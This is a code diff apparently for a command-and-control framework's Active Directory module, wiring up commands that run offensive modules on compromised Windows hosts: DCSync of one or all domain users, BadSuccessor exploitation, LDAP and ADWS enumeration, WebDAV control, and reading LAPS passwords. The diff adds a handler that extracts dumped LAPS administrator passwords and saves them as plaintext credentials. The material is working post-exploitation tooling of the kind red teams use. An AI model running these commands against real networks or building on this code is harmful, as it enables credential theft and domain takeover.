@@ -20,7 +20,7 @@ cmd_adwssearch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let bof_path = ax.script_dir() + "_bin/adws_search." + ax.arch(id) + ".o";
     let message = "BOF implementation: adws search";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
 });
 
 
@@ -44,7 +44,7 @@ cmd_badtakeover.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
     let bof_path = ax.script_dir() + "_bin/badtakeover." + ax.arch(id) + ".o";
     let message = "Exploiting BadSuccessor...";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
 });
 
 
@@ -153,7 +153,7 @@ _cmd_dcsync_single.setPreHook(function (id, cmdline, parsed_json, ...parsed_line
 
     let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int,int", [target, is_dn, ou_path, dc_address, use_ldaps, only_nt]);
     let bof_path = ax.script_dir() + "_bin/dcsync-single." + ax.arch(id) + ".o";
-    ax.execute_alias_handler(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `DCSyncing user ${target}...`, dcsync_handler);
+    ax.execute_alias_handler(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, `DCSyncing user ${target}...`, dcsync_handler);
 });
 
 var _cmd_dcsync_all = ax.create_command( "all", "Perform DCSync operations for all users in the domain", "dcsync all -ou 'OU=Users,DC=corp,DC=local' -dc dc01.corp.local --ldaps" );
@@ -171,7 +171,7 @@ _cmd_dcsync_all.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
 
     let bof_params = ax.bof_pack("cstr,cstr,int,int,int", [ou_path, dc_address, use_ldaps, only_nt, only_users]);
     let bof_path = ax.script_dir() + "_bin/dcsync-all." + ax.arch(id) + ".o";
-    ax.execute_alias_handler(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "DCSyncing all users...", dcsync_handler);
+    ax.execute_alias_handler(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "DCSyncing all users...", dcsync_handler);
 });
 
 var cmd_dcsync = ax.create_command( "dcsync", "Perform DCSync operations (DCSync-BOF)", "dcsync {subcommand} [options]" );
@@ -205,7 +205,7 @@ cmd_ldapsearch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let bof_path = ax.script_dir() + "_bin/ldapsearch." + ax.arch(id) + ".o";
     let message = "BOF implementation: ldapsearch";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
 });
 
 
@@ -258,12 +258,61 @@ _cmd_ldapq_computers.setPreHook(function (id, cmdline, parsed_json, ...parsed_li
     let bof_path = ax.script_dir() + "_bin/ldapsearch." + ax.arch(id) + ".o";
     let message = "BOF ldapsearch: query computers";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message, hook);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message, hook);
 });
 
 var cmd_ldapq = ax.create_command("ldapq", "Ldap query objects", "ldapq computers");
 cmd_ldapq.addSubCommands([_cmd_ldapq_computers]);
 
+
+
+
+let readlaps_handler = function (task) {
+    const lines = task.text.split(/\r?\n/);
+    let target = "";
+
+    const reTarget = /^\[\*\]\s+Target:\s+(.+)$/;
+    const reLegacyPass = /^\[\+\]\s+Legacy\s+LAPS\s+Password:\s+(.+)$/;
+    const reV2Pass = /^\[\+\]\s+Decrypted\s+Output:\s+(.+)$/;
+
+    for (const line of lines) {
+        const trimmed = line.trim();
+        if (!trimmed) continue;
+
+        let m = reTarget.exec(trimmed);
+        if (m) {
+            target = m[1];
+            continue;
+        }
+
+        let password = null;
+        let type = "laps";
+
+        m = reLegacyPass.exec(trimmed);
+        if (m) {
+            password = m[1];
+            type = "laps-legacy";
+        } else {
+            m = reV2Pass.exec(trimmed);
+            if (m) {
+                password = m[1];
+                type = "laps-v2";
+            }
+        }
+
+        if (password && target) {
+            ax.credentials_add_list([{
+                username: "Administrator",
+                type: "plaintext",
+                password: password,
+                storage: type,
+                realm: target,
+                host: target,
+                tag: "laps"
+            }]);
+        }
+    }
+};
 
 
 
@@ -281,12 +330,10 @@ cmd_readlaps.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
     if (!target && !target_dn) {
         throw new Error("Either -target (sAMAccountName) or -target-dn (Distinguished Name) must be specified");
-        return;
     }
 
     if (target && target_dn) {
         throw new Error("Cannot specify both -target and -target-dn");
-        return;
     }
 
     // If -dn not specified, derive from agent domain
@@ -297,7 +344,6 @@ cmd_readlaps.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
             dn = parts.map(part => "DC=" + part).join(",");
         } else {
             throw new Error("Could not auto-detect DN. Agent domain not available. Please specify -dn manually.");
-            return;
         }
     }
 
@@ -328,10 +374,11 @@ cmd_readlaps.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
         message = `Read LAPS password for ${target_dn}`;
     }
 
-    let bof_params = ax.bof_pack("cstr,cstr,cstr", [dc, dn, searchFilter]);
+    let reportTarget = target ? target : target_dn;
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [dc, dn, searchFilter, reportTarget]);
     let bof_path = ax.script_dir() + "_bin/readlaps." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+    ax.execute_alias_handler(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message, readlaps_handler);
 });
 
 
@@ -342,7 +389,7 @@ var _cmd_webdav_enable = ax.create_command("enable", "Enable the WebDAV client s
 _cmd_webdav_enable.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let bof_path = ax.script_dir() + "_bin/webdav_enable." + ax.arch(id) + ".o";
     let message = "Enable the WebDAV client service";
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, message);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, message);
 });
 
 var _cmd_webdav_status = ax.create_command("status", "Determine if the WebDAV is running on a remote system", "webdav status 192.168.0.1,192.168.0.2");
@@ -354,7 +401,7 @@ _cmd_webdav_status.setPreHook(function (id, cmdline, parsed_json, ...parsed_line
     let bof_path = ax.script_dir() + "_bin/webdav_status." + ax.arch(id) + ".o";
     let message = "Task: Check WebDAV status";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, message);
 });
 
 var cmd_webdav = ax.create_command("webdav", "Manage webdav service", "webdav enable");
@@ -365,11 +412,3 @@ cmd_webdav.addSubCommands([_cmd_webdav_status]);
 
 var group_exec = ax.create_commands_group("AD-BOF", [cmd_adwssearch, cmd_badtakeover, cmd_dcsync, cmd_ldapsearch, cmd_ldapq, cmd_readlaps, cmd_webdav]);
 ax.register_commands_group(group_exec, ["beacon", "gopher", "kharon"], ["windows"], []);
-
-
-
-ax.script_import(ax.script_dir() + "ADCS-BOF/ADCS.axs")
-ax.script_import(ax.script_dir() + "Kerbeus-BOF/kerbeus.axs")
-ax.script_import(ax.script_dir() + "SQL-BOF/SQL.axs")
-ax.script_import(ax.script_dir() + "LDAP-BOF/LDAP.axs")
-ax.script_import(ax.script_dir() + "RelayInformer/RelayInformer.axs")
